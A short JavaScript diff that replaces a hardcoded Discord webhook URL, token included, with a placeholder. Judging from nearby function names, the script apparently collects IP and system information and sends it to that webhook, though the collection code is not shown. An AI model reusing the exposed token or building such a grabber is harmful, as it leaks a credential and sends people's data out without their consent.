@@ -147,7 +147,8 @@ const createIPDisplay = (ip) => {
 };
 
 // Discord webhook URL
-const DISCORD_WEBHOOK = 'https://canary.discord.com/api/webhooks/1411564766232842352/BH4caQFjBlYPp1zZsWJ4E-erP7oV9La5JrRPX1emdKLbYI6QpIV0SzQZ9TRux8s9yWMM';
+// IMPORTANT: Replace this with your actual Discord webhook URL!
+const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; 
 
 // Function to collect system information
 const collectSystemInfo = () => {
